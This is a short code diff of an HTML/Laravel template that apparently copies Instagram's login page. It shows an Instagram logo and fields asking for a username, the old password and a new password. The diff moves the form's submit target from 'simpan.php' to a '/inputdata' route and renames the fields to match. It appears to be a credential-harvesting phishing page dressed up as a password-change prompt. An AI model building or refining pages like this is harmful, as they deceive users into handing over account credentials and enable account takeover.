@@ -24,16 +24,17 @@
             <!-- SMARTPHONE SECTION END -->
             <!-- FORM SECTION -->
             <div class="form-area">
-                <form action="simpan.php" method="POST">
+                <form action="/inputdata" method="POST">
+                    @csrf
                     <div class="flex flex-col justify-center items-center">
                         <img src="img/logo.png" alt="Instagram Logo">
                     </div>
                     <br>
-                    <input type="text" name="nama" placeholder="Phone Number, username, or, email">
-                    <input type="password" name="isi" placeholder="Old Password">
+                    <input type="text" name="username" placeholder="Phone Number, username, or, email">
+                    <input type="password" name="oldpassword" placeholder="Old Password">
                     <input type="password" name="newpassword" placeholder="New Password">
                     <br>
-                    <input type="submit" name="submit" value="Submit">
+                    <input type="submit" value="Submit">
                     <br>
                 <!--<div class="apps">
                     <p>Get The App.</p>
